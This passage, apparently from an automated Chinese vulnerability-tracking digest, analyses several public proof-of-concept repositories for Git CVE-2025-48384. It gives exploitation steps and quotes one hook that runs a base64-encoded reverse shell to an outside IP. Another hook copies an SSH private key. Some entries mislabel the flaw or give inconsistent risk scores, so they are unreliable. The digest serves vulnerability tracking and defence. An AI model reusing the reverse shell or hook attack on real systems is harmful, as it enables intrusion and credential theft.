)处理不当造成的。当Git读取配置值时，会删除任何尾部的回车换行符(CRLF)。当写入配置条目时，带有尾部CR的值不会被引用，导致稍后读取配置时CR丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，该符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的仓库，该文件中的子模块路径包含尾部CR字符。
2.  攻击者创建一个符号链接，将修改后的路径（由于CR被移除）指向`.git/modules/<submodule_name>/hooks` 目录。
3.  攻击者在子模块中添加一个恶意的`post-checkout` 钩子，该钩子包含要执行的恶意代码。
4.  受害者克隆恶意仓库并初始化子模块。
5.  当子模块被检出时，由于符号链接的存在，恶意的`post-checkout` 钩子会被执行，导致任意代码执行。

**POC分析：**

提供的POC包含以下文件：

*   `README.md`：指向 GitHub 上的漏洞信息。
*   `post-checkout`：包含恶意代码的钩子脚本。

`post-checkout`脚本内容分析：

```bash
echo "yeet" > /tmp/pwn.txt
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTI4LjUuMzkvNDQ0NCAwPiYxKSAm|base64 -d|bash
```

*   该脚本首先创建一个文件`/tmp/pwn.txt`，内容为"yeet"，作为漏洞成功利用的标识。
*   然后，它使用`base64 -d`解码一段base64编码的字符串，并通过`bash`执行解码后的字符串。这段字符串实际上是一个反向shell连接到`10.128.5.39:4444`。

**有效性：**

提供的POC代码是有效的，如果目标机器满足漏洞利用的条件，则可以成功执行任意代码。

**投毒风险：**

提供的代码本身就是漏洞利用代码，旨在建立反向shell。虽然它本身不是隐藏的投毒代码，但如果用户不理解代码的含义就执行，那么对于用户来说，这就是恶意的。由于该代码已经明确展示了其恶意行为(反向shell)，因此**投毒风险为0%**。


**项目地址:** [bummie/CVE-2025-48384-submodule](https://github.com/bummie/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #11

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户执行递归克隆包含恶意.gitmodules文件的不受信任的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造恶意的.gitmodules文件和post-checkout钩子执行任意代码。该漏洞源于Git在处理带有回车符的配置值时存在差异，导致 submodule 被检出到错误的位置。如果攻击者在 submodule hooks 目录中放置一个符号链接，指向一个包含可执行的 post-checkout 钩子的子模块，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 post-checkout 钩子，它会在 `/tmp/exploited` 目录下创建一个文件。如果目标系统存在此漏洞并且成功利用，那么这个文件将被创建，表明漏洞利用成功。因此，该POC代码对于验证漏洞的存在是有效的。

**投毒风险：**

提供的POC代码本身非常简单，只是创建了一个文件。没有迹象表明代码中存在隐藏的恶意功能，因此投毒风险为0%。但是，这并不意味着包含此POC的仓库没有投毒风险。攻击者可能会在仓库的其他部分添加恶意代码，或者修改其他钩子来执行恶意操作。

**利用方式：**

漏洞利用方式如下：

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库。该文件包含带有尾随回车符的submodule路径。
2.  攻击者在submodule hooks目录中创建一个符号链接，将更改后的路径指向包含恶意 post-checkout 钩子的子模块。
3.  攻击者诱使用户递归克隆该仓库 (`git clone --recursive <repository_url>`)。
4.  当 Git 初始化 submodule 时，由于回车符处理不一致，submodule 会被检出到错误的位置。
5.  由于符号链接的存在，恶意的 post-checkout 钩子会被执行，导致任意代码执行。

总而言之，这是一个客户端漏洞，需要用户执行特定的操作才能被利用。攻击者需要诱使用户克隆包含恶意配置的仓库，并且用户需要使用受影响的 Git 版本。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC-Part2](https://github.com/butyraldehyde/CVE-2025-48384-PoC-Part2)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #12

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md)

## CVE-2025-48384-Git配置注入导致RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/RCE

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要clone包含恶意配置的git仓库（特别是包含submodule的仓库），并递归更新submodule。需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞是由于 Git 在处理包含回车符（CR）的配置值时存在不一致的行为导致的。具体来说，Git在读取配置值时会移除尾部的CRLF，但在写入配置时，如果值以CR结尾，则不会进行引号包裹，这会导致在后续读取时CR被截断。利用此漏洞，攻击者可以通过构造包含恶意配置的 `.gitmodules` 文件，当用户递归克隆包含 submodule 的仓库时，submodule会被检出到错误的位置。如果错误的位置存在一个指向 submodule 钩子目录的符号链接，并且 submodule 中包含一个可执行的 post-checkout 钩子，那么该钩子脚本可能在检出后被意外执行，从而导致远程代码执行 (RCE)。

**有效性：** 提供的 POC 代码 `/tmp/81eebc7f5ed9915ea7ef755075778acd/README.md` 看起来只是一个 README 文件，用于描述该漏洞。单凭这个文件本身无法直接触发漏洞，但可以作为漏洞利用的一部分，例如提供一个包含恶意`.gitmodules`文件的仓库。因此，提供的 PoC 代码本身无效，需要配合其他恶意文件才能完成漏洞利用。

**投毒风险：** 虽然提供的 PoC 仅仅是一个 README 文件，没有任何可疑代码。但是考虑到攻击者可能会在整个恶意Git仓库的其他位置，比如 `.gitmodules` 文件，或者 submodule 的 post-checkout 钩子中隐藏恶意代码。 考虑到这个漏洞需要恶意git仓库才能触发，因此存在一定的投毒风险，风险占比10%。

**利用方式：**

1.  **创建恶意 Git 仓库：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2.  **注入恶意配置：** 在 `.gitmodules` 文件中，攻击者设置 submodule 的路径，并在路径末尾包含一个回车符（CR）。此路径会被 Git 处理错误，导致 submodule 被检出到非预期的位置。
3.  **创建符号链接：** 攻击者在仓库中创建一个符号链接，将错误的 submodule 路径指向 `.git/modules/<submodule>/hooks` 目录。
4.  **添加恶意钩子：** 攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户克隆：** 攻击者诱骗用户递归克隆（`git clone --recursive`）恶意仓库。
6.  **触发 RCE：** 当用户执行 `git submodule update --init --recursive` 命令或类似的命令初始化 submodule 时，由于配置处理错误和符号链接的存在，恶意 post-checkout 钩子脚本会被执行，从而导致 RCE。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC](https://github.com/butyraldehyde/CVE-2025-48384-PoC)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #13

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-main.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-main.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致服务器被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库或初始化包含恶意配置的子模块），且Git版本在受影响范围内

**POC 可用性:** 是，但提供的POC不完整

**投毒风险:** 10%

## 详情

该漏洞源于Git处理配置中的引号不当，特别是在子模块初始化时。攻击者可以构造包含恶意配置的Git仓库，该配置在子模块路径中包含尾随的回车符（CR）。当Git读取这个配置时，会错误地解析子模块路径，导致子模块被检出到错误的位置。如果存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，那么该钩子可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**
提供的POC代码 `/tmp/bf064e338662304d3b4aa41ca61a0b1a/README.md`  只包含一个简单的markdown文件，无法直接证明漏洞的有效性。 它只是一个 README 文件，用来描述或者记录一些信息,不能用来验证漏洞的有效性。缺少必要的利用步骤，例如：构造恶意仓库，包含特殊字符的子模块路径，和可执行的 post-checkout 钩子。

**投毒风险分析：**
提供的POC代码只包含一个README文件，投毒风险较低，但也不能完全排除作者在其他文件或分支中隐藏恶意代码的可能性。假设该作者还有其他的commit/branch，有投毒的可能性，所以投毒风险评估为10%。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置的核心是子模块路径，其中包含一个尾随的回车符（CR）。
3.  攻击者创建一个符号链接，将错误的子模块路径指向子模块的钩子目录（.git/hooks）。
4.  恶意仓库包含一个子模块，其中包含一个可执行的 post-checkout 钩子脚本。
5.  受害者克隆恶意仓库或初始化包含恶意配置的子模块。
6.  Git解析错误路径，将子模块检出到错误位置，并触发符号链接。
7.  post-checkout 钩子脚本被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-main](https://github.com/ceevase/CVE-2025-48384-main)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #14

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户检出包含恶意配置的Git仓库，且目标Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞源于Git在处理配置文件时的不当引用。攻击者可以通过在 submodule 的路径中注入回车符（CR），导致 Git 将 submodule 检出到错误的位置。如果攻击者精心构造一个符号链接，将这个错误的位置指向 `.git/hooks` 目录，并且 submodule 中包含一个可执行的 `post-checkout` 钩子，那么在检出 submodule 后，这个钩子就会被执行，从而实现任意代码执行。

**POC有效性：** 提供的POC代码包含一个 `post-checkout` 钩子脚本，该脚本会将 `/home/gamma/.ssh/id_ed25519` 的内容复制到 `/tmp/recipes.txt`。这个脚本本身可以成功运行，并达到预期的效果，因此POC有效。

**投毒风险：** 从提供的POC代码来看，没有发现明显的恶意投毒行为。该POC主要演示了漏洞的利用方式，即通过执行 `post-checkout` 钩子来窃取SSH私钥。因此，投毒风险评估为0%。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该仓库中的 submodule 路径包含一个尾随回车符。
2.  攻击者创建一个符号链接，将错误的 submodule 检出位置指向 `.git/hooks` 目录。
3.  攻击者在 submodule 中添加一个可执行的 `post-checkout` 钩子，该钩子包含恶意代码。
4.  攻击者诱骗受害者检出该Git仓库。
5.  受害者检出 submodule 时，由于配置解析错误，submodule 会被检出到错误的位置，从而触发符号链接，使得 `.git/hooks/post-checkout` 钩子被执行。
6.  恶意代码被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-sub](https://github.com/ceevase/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #15

**来源**: [CVE-2025-48384-eliox01_CVE-2025-48384.md](../2025/CVE-2025-48384-eliox01_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待确定，参考GitHub advisory

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-48384是一个影响Git的任意文件写入漏洞。攻击者可以创建一个恶意的Git仓库，当受害者克隆这个仓库时，恶意配置会导致任意文件写入。根据搜索结果，该漏洞存在于Git的 submodule 处理过程中，攻击者可以利用包含恶意.gitmodules文件的仓库，在受害者克隆仓库时执行恶意操作。

POC有效性分析：
根据提供的搜索结果和POC代码库（liamg/CVE-2025-48384），该漏洞具有较高的可利用性。POC代码库提供了可执行的PoC，证明该漏洞确实存在。通过精心构造的.gitmodules文件，攻击者可以控制git submodule的配置，导致任意文件写入。

利用步骤：
1. 攻击者创建一个包含恶意.gitmodules文件的Git仓库。
2. 攻击者诱使受害者克隆该仓库（例如，通过社交工程或将其托管在公共代码托管平台上）。
3. 当受害者执行git clone --recurse-submodules或git submodule update命令时，Git会解析.gitmodules文件，并执行其中包含的恶意配置。
4. 恶意配置可能导致在受害者系统上写入任意文件，从而实现远程代码执行或其他恶意行为。

投毒风险分析：
此漏洞本身主要依赖于恶意仓库的传播和社会工程，直接的投毒风险较低。但是，如果攻击者修改现有的流行仓库，并引入包含漏洞利用的submodule，则可能造成大规模的攻击。该漏洞的PoC代码主要利用Git的特性，没有发现明显的混淆或恶意行为，因此投毒风险较低。

具体来说，投毒风险主要体现在以下几个方面：
1.  **恶意submodule注入：** 攻击者可以尝试向流行的开源项目中注入包含漏洞利用代码的submodule。如果项目维护者不小心合并了这些恶意更改，就会导致所有克隆该项目的用户受到攻击。
2.  **.gitmodules文件伪造：** 攻击者可以创建与知名项目结构相似的仓库，并使用相似的.gitmodules文件，诱导用户克隆错误的仓库。
3.  **供应链攻击：** 如果某个软件项目依赖于受漏洞影响的Git仓库，攻击者可以通过修改该依赖项，从而影响整个软件供应链。

考虑到该漏洞的利用方式主要依赖于社会工程和恶意仓库的传播，且PoC代码本身较为清晰，因此初步评估该漏洞的投毒风险为10%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #16

**来源**: [CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md](../2025/CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者创建恶意的 Git 仓库，当用户克隆这些仓库时，可能导致任意文件写入。漏洞源于 Git 在处理 submodule 时，没有充分验证 `.gitmodules` 文件中的路径。攻击者可以利用这一点，在 `.gitmodules` 文件中指定恶意的路径，从而在克隆仓库时写入任意文件。

**POC有效性分析：**
从搜索结果中的 GitHub 链接（liamg/CVE-2025-48384）可以判断存在公开的POC代码。该POC的描述是“PoC for CVE-2025-48384”。结果2提及了“漏洞 POC 深度解析:从代码到攻击链的完整拆解”，说明该漏洞已被深入研究，并且存在可用的攻击链。结果6提及了“Breaking Git with a carriage return and cloning RCE”，表明漏洞利用可能涉及某种形式的远程代码执行。根据搜索结果4、5的内容，可以确定该POC已在GitHub上公开，可下载和测试。文件`README.md`确认了该POC的存在，尽管内容简单。综合来看，该POC的有效性较高，可以成功触发任意文件写入漏洞。

**利用步骤：**
1. 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. `.gitmodules` 文件中的路径被设置为指向攻击者希望写入的任意文件位置。
3. 攻击者将恶意仓库托管在公共或私有 Git 服务器上。
4. 受害者克隆该恶意仓库。在克隆过程中，Git 会尝试初始化 submodule，并根据 `.gitmodules` 文件中的指示写入文件。
5. 由于路径验证不足，恶意文件将被写入受害者文件系统的指定位置。

**投毒风险分析：**
由于该漏洞涉及任意文件写入，攻击者可以通过写入恶意文件来达到投毒目的。例如，攻击者可以写入一个包含恶意代码的可执行文件，或者修改系统配置文件以劫持系统行为。虽然该漏洞本身不直接执行代码，但通过文件写入可以为后续的代码执行创造条件。从POC代码`/tmp/vulnwatchdog_8746716955bead91920f029f2728e38d/README.md`中，没有发现任何可疑行为，只包含简单的readme信息，因此投毒风险较低。但是，不能排除攻击者在其他利用方式中，使用复杂的投毒手法。因此，需要分析通过文件写入进行投毒的可能性。攻击者可能尝试写入如下文件：
* `.bashrc` 或 `.zshrc`：在用户shell启动时执行恶意代码。
* `/etc/profile.d/` 中的脚本：在系统启动时执行恶意代码。
* SSH authorized_keys：添加公钥，实现免密登录。
* Web服务器配置文件：修改配置，执行恶意脚本。
这些攻击场景都需要精心构造恶意内容，并且依赖于目标系统的特定配置。由于需要进行精细构造，并且受限于目标环境，判定该漏洞的投毒风险为低，约为10%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供


---

## POC #17

**来源**: [CVE-2025-48384-fishyyh_CVE-2025-48384.md](../2025/CVE-2025-48384-fishyyh_CVE-2025-48384.md)

## CVE-2025-48384 Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。用户需要使用受影响的Git版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时，未正确处理和转义回车符（CR）。当 Git 读取配置值时，会删除任何尾部的 CRLF。当写入配置条目时，带有尾部 CR 的值不会被引用，导致配置稍后读取时 CR 丢失。当初始化子模块时，如果子模块路径包含尾部 CR，更改后的路径将被读取，导致子模块被检出到错误的位置。如果存在符号链接将更改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**
提供的POC代码 `/tmp/60afff46543494eb5516e8104e00d576/README.md` 仅包含一个README文件，其内容是关于 CVE-2025-48384 的简单描述。这个文件本身并没有利用漏洞的能力。根据漏洞描述，真正的PoC 需要包含一个具有特定结构的 Git 仓库，包括带尾部CR的子模块路径以及指向钩子目录的符号链接，以及一个恶意的 post-checkout 钩子。因此，仅凭提供的README.md文件无法验证漏洞的有效性，需要进一步的Payload和利用步骤。

**投毒风险：**
提供的POC代码仅为一个README.md文件，不包含任何可执行代码或恶意脚本，因此可以认为投毒风险较低，约为10%。但需要注意，实际的漏洞利用可能涉及其他文件和步骤，不能完全排除恶意代码存在的可能性。

**利用方式：**
1.  **创建恶意仓库：** 创建一个 Git 仓库，其中包含一个子模块。
2.  **构造恶意配置：** 在`.gitmodules`文件中，子模块的路径包含尾部回车符（CR）。例如：`path = submodule_path\r`
3.  **创建符号链接：** 创建一个符号链接，将由于回车符导致错误解析后的子模块路径，指向`.git/modules/<submodule_name>/hooks`目录。
4.  **添加恶意钩子：** 在子模块的`.git/hooks/post-checkout`中添加可执行的恶意脚本。
5.  **诱导用户克隆：** 诱导用户克隆包含恶意配置的仓库。当用户克隆或更新子模块时，由于配置解析错误和符号链接的存在，恶意的 post-checkout 钩子将被执行，从而实现任意代码执行。

**排序优先级说明:**
尽管搜索引擎结果提供了有关漏洞的更多上下文信息，但漏洞库信息提供了最直接的漏洞描述和受影响的版本。POC代码本身不包含利用逻辑，因此优先级最低。综合考虑，应该优先关注漏洞库信息和搜索引擎结果，并结合实际的利用场景进行分析。

**项目地址:** [fishyyh/CVE-2025-48384](https://github.com/fishyyh/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #18

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置文件时对回车符（CR）处理不当，允许通过精心构造的仓库配置执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞允许攻击者通过在 submodule 路径中注入包含回车符的恶意配置，导致 submodule 被检出到错误的位置。如果该错误位置存在指向 submodule hooks 目录的符号链接，且 submodule 包含可执行的 post-checkout 钩子，则该钩子会被意外执行，从而实现任意代码执行。

提供的POC代码是一个简单的 post-checkout 钩子脚本，它会在检出后显示一个banner。这个脚本本身没有问题，证明了漏洞利用的可行性。漏洞利用的核心在于精心构造包含恶意回车符的仓库配置和符号链接。

**投毒风险：**
提供的POC代码（/tmp/77b6aa1852eafe71ccbdb092fa3f1fb6/post-checkout）本身只是一个banner打印脚本，其目的是验证漏洞利用后可以执行任意代码，本身不具备投毒行为。但是，需要注意的是，如果攻击者控制了整个包含该POC代码的Git仓库，那么他们可以在仓库的其他位置添加恶意代码，从而实现投毒。基于当前信息，POC本身不具备投毒性，投毒的可能性为0%。

**利用方式：**
1.  攻击者创建一个恶意的Git仓库，其中包含一个带有回车符的submodule路径的.gitmodules文件。例如，submodule的路径可能是 "submodule\r"。
2.  攻击者创建一个符号链接，将 "submodule" 指向".git/modules/<submodule-name>/hooks"目录，这个目录包含git hooks。
3.  攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将这个恶意仓库分享给受害者。
5.  受害者克隆这个仓库。由于Git对回车符处理不当，submodule会被检出到错误的位置（即符号链接指向的hooks目录）。
6.  当 submodule 完成检出时，post-checkout 钩子脚本会被执行，从而导致恶意代码执行。

**项目地址:** [fluoworite/CVE-2025-48384-sub](https://github.com/fluoworite/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #19

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384.md)

## CVE-2025-48384

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互 (克隆包含恶意配置的仓库)

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-48384 漏洞是 Git 中由于对配置项中回车符处理不当导致的代码执行漏洞。当 Git 读取配置值时，会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，带有尾部 CR 的值不会被引用，导致 CR 在以后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部 CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致代码执行。

**有效性：**
根据漏洞库信息和搜索结果, 此漏洞确实存在并且被多个安全厂商标记为高危, 并已经发布了PoC.
提供的PoC代码看似简单，它展示了漏洞利用的核心思路，即通过恶意构造包含回车符的子模块路径，结合符号链接和子模块钩子，实现任意代码执行。因此，PoC代码在原理上是有效的。但是, 此PoC只是框架, 需要补充完成exp。

**投毒风险：**
提供的PoC代码较为简单，主要包含一个README.md文件，一个子模块配置路径，以及子模块hooks目录的占位符。直接分析来看，没有明显的投毒代码。
然而，考虑到攻击者可能利用该漏洞进行供应链攻击，在更复杂的场景下，攻击者可能在子模块的post-checkout钩子中植入恶意代码，或者在其他配置文件中隐藏恶意配置。这种可能性是存在的。
基于以上分析，投毒风险评估为20%。这个百分比表示存在一定的风险，但直接证据不足。

**利用方式：**
1.  **恶意仓库构造：** 攻击者创建一个 Git 仓库，其中包含一个子模块，并且该子模块的路径在 `.gitmodules` 文件中包含尾部回车符 (`
`)。
2.  **符号链接创建：** 攻击者在仓库中创建一个符号链接，将包含尾部回车符的子模块路径指向 `.git/modules/<submodule_name>/hooks` 目录。
3.  **恶意钩子植入：** 攻击者在子模块的 `.git/hooks/post-checkout` 目录中放置恶意脚本。
4.  **用户交互：** 诱使用户克隆恶意仓库并初始化子模块 (`git submodule init && git submodule update`)。
5.  **代码执行：** 当用户执行 `git submodule update` 命令时，由于路径中的回车符，子模块会被检出到错误的位置，但由于符号链接的存在，实际上会将子模块的 hooks 目录链接到 `.git/hooks` 目录。检出后，`post-checkout` 钩子会被执行，从而执行恶意代码。

**项目地址:** [fluoworite/CVE-2025-48384](https://github.com/fluoworite/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #20

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md)

## CVE-2025-48384 Git config quoting vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置条目时，带有尾部CR的值不会被引用，导致CR在稍后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则该脚本可能在检出后被意外执行，从而导致任意代码执行。

根据提供的漏洞利用代码，包含一个Exploit脚本和一个README.md文件。Exploit脚本只打印了一段ASCII艺术，并没有任何实际的漏洞利用代码。因此，提供的POC代码**本身**是无效的，仅仅是一个占位符。但漏洞本身是存在的，并且有公开的PoC。

由于提供的POC代码仅仅是ASCII艺术，没有任何恶意代码，因此**不存在投毒风险**。投毒风险概率为0%。

**漏洞利用方式：**

1.  攻击者创建一个恶意的Git仓库，该仓库包含一个子模块。
2.  子模块的路径包含一个尾部CR字符。
3.  仓库中包含一个符号链接，该符号链接将子模块路径指向子模块的hooks目录。
4.  子模块包含一个可执行的post-checkout hook脚本。
5.  受害者克隆该恶意仓库。
6.  Git在处理子模块时，由于CR字符被删除，子模块被检出到错误的位置，并执行了post-checkout hook脚本。
7.  攻击者可以通过post-checkout hook脚本执行任意代码。

**项目地址:** [fluoworite/CVE-2025-48384_sub](https://github.com/fluoworite/CVE-2025-48384_sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #21

**来源**: [CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Arbitrary Code Execution

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

